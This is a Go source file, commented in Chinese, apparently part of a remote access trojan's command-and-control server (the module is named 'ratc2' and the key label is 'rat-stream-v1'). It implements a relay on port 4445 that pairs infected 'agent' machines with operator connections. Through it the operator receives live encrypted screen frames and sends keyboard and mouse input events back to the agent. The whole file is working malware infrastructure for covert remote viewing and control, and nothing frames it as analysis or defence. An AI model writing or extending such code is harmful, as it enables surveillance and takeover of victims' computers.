// beacon_stream.go — 屏幕流长连接中继（协议 §9）
// 端口 4445：Agent 屏幕连接 ↔ ctl 连接的帧上行 / 输入事件下行双向中转
package main

import (
	"encoding/hex"
	"log"
	"net"
	"sync"

	"ratc2/internal/protocol"
)

const streamAddr = "0.0.0.0:4445"

// streamPeer 等待 agent 屏幕连接的 ctl 信息
type streamPeer struct {
	cli    net.Conn
	cliKey []byte
}

// streamSession agent 屏幕连接会话（含配对信息）
type streamSession struct {
	conn   net.Conn
	key    []byte // stream_key
	cli    net.Conn
	cliKey []byte
}

// StreamRegistry 屏幕流配对表（并发安全）
type StreamRegistry struct {
	mu    sync.Mutex
	reqs  map[string]streamPeer             // agentID -> 等待配对的 ctl
	conns map[string]*streamSession         // agentID -> agent 屏幕连接
}

func NewStreamRegistry() *StreamRegistry {
	return &StreamRegistry{
		reqs:  make(map[string]streamPeer),
		conns: make(map[string]*streamSession),
	}
}

// RegisterRequest ctl 请求开启屏幕流时登记（等待 agent 屏幕连接到来）。
func (r *StreamRegistry) RegisterRequest(agentID string, cli net.Conn, cliKey []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.reqs[agentID] = streamPeer{cli: cli, cliKey: cliKey}
}

// ClearRequest ctl 请求停止时清理等待记录。
func (r *StreamRegistry) ClearRequest(agentID string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.reqs, agentID)
}

// RegisterAgent agent 屏幕连接握手成功后登记，并尝试与等待的 ctl 配对。
// 返回是否配对成功。
func (r *StreamRegistry) RegisterAgent(agentID string, conn net.Conn, key []byte) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	// 踢旧：先删旧条目再关连接，避免旧连接的 defer RemoveAgent 误删新连接
	if old, ok := r.conns[agentID]; ok && old.conn != nil && old.conn != conn {
		delete(r.conns, agentID)
		old.conn.Close()
		log.Printf("[stream] %s: kicked old connection", agentID)
	}
	s := &streamSession{conn: conn, key: key}
	paired := false
	if p, ok := r.reqs[agentID]; ok {
		s.cli = p.cli
		s.cliKey = p.cliKey
		delete(r.reqs, agentID)
		paired = true
	}
	r.conns[agentID] = s
	return paired
}

// GetSession 取 agent 屏幕连接会话。
func (r *StreamRegistry) GetSession(agentID string) *streamSession {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.conns[agentID]
}

// RemoveAgent agent 屏幕连接断开时清理；仅当表中仍是本连接时删除
// （避免与重连竞态：新连接注册后，旧连接的清理不得误删新连接）。
func (r *StreamRegistry) RemoveAgent(agentID string, conn net.Conn) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if s, ok := r.conns[agentID]; ok && s.conn == conn {
		delete(r.conns, agentID)
		log.Printf("[stream] %s: removed stream connection", agentID)
	}
}

// RemoveCLI 某 ctl 连接断开时，清理其发起的所有等待/配对。
func (r *StreamRegistry) RemoveCLI(conn net.Conn) {
	r.mu.Lock()
	defer r.mu.Unlock()
	for k, p := range r.reqs {
		if p.cli == conn {
			delete(r.reqs, k)
		}
	}
	for _, s := range r.conns {
		if s.cli == conn {
			s.cli = nil
			s.cliKey = nil
		}
	}
}

// startBeaconStreamServer 启动 4445 屏幕流长连接监听。
func startBeaconStreamServer(psk []byte, reg *StreamRegistry) {
	ln, err := net.Listen("tcp", streamAddr)
	if err != nil {
		log.Fatalf("stream listen %s: %v", streamAddr, err)
	}
	log.Printf("screen-stream listening on %s", streamAddr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("stream accept: %v", err)
			continue
		}
		go handleStreamConn(conn, psk, reg)
	}
}

// handleStreamConn 处理 agent 屏幕连接：握手 → 帧上行中转。
func handleStreamConn(conn net.Conn, psk []byte, reg *StreamRegistry) {
	defer conn.Close()
	log.Printf("[stream] agent conn from %s", conn.RemoteAddr())

	// 握手（明文）：StreamHello(agent_id+client_nonce) → StreamAck(server_nonce)
	h, raw, err := protocol.ReadPacket(conn)
	if err != nil || h.Cmd != protocol.CmdStreamHello || len(raw) < 16+16 {
		log.Printf("[stream] bad hello")
		return
	}
	agentIDHex := hex.EncodeToString(raw[:16])
	clientNonce := raw[16:32]

	serverNonce := make([]byte, 16)
	randRead(serverNonce)
	// stream_key = HKDF(psk, agent_id||client_nonce||server_nonce, "rat-stream-v1")
	key := protocol.StreamKey(psk, raw[:16], clientNonce, serverNonce)

	if err := protocol.WritePacket(conn, &protocol.Header{
		Cmd: protocol.CmdStreamAck,
	}, serverNonce); err != nil {
		return
	}

	paired := reg.RegisterAgent(agentIDHex, conn, key)
	log.Printf("[stream] %s connected (paired=%v)", agentIDHex, paired)
	defer reg.RemoveAgent(agentIDHex, conn)

	// 帧上行：收 agent 帧 → 转发给配对 ctl
	var lastSeq uint32
	relayed := 0
	for {
		h, raw, err := protocol.ReadPacket(conn)
		if err != nil {
			return
		}
		plain, err := protocol.DecryptPayload(key, raw)
		if err != nil {
			continue
		}
		if h.Seq <= lastSeq {
			continue
		}
		lastSeq = h.Seq
		if h.Cmd != protocol.CmdScreenFrame {
			continue
		}
		s := reg.GetSession(agentIDHex)
		if s == nil || s.cli == nil {
			continue // 未配对：丢弃帧
		}
		// 用 ctl 连接密钥重加密后转发（cmd/seq 原样）
		enc, err := protocol.EncryptPayload(s.cliKey, plain)
		if err != nil {
			continue
		}
		relayed++
		if relayed%10 == 1 || relayed <= 3 {
			log.Printf("[stream] %s: relay frame #%d (seq=%d, %d bytes)", agentIDHex, relayed, h.Seq, len(plain))
		}
		if err := protocol.WritePacket(s.cli, &protocol.Header{
			Flags: protocol.FlagEncrypted, Seq: h.Seq, Cmd: h.Cmd,
		}, enc); err != nil {
			log.Printf("[stream] relay to ctl failed: %v", err)
		}
	}
}

// relayInputEvents 把 ctl 发来的输入事件转发给 agent 屏幕连接（去掉 agentID 前缀）。
func relayInputEvents(reg *StreamRegistry, agentIDHex string, payload []byte) bool {
	s := reg.GetSession(agentIDHex)
	if s == nil {
		return false
	}
	// payload = agent_id(16) + count+events → 转发 count+events（stream key 加密）
	inner := payload[16:]
	enc, err := protocol.EncryptPayload(s.key, inner)
	if err != nil {
		return false
	}
	if err := protocol.WritePacket(s.conn, &protocol.Header{
		Flags: protocol.FlagEncrypted, Cmd: protocol.CmdInputEvents,
	}, enc); err != nil {
		log.Printf("[stream] relay input to %s failed: %v", agentIDHex, err)
		return false
	}
	log.Printf("[stream] %s: relayed input events (%d bytes)", agentIDHex, len(inner))
	return true
}

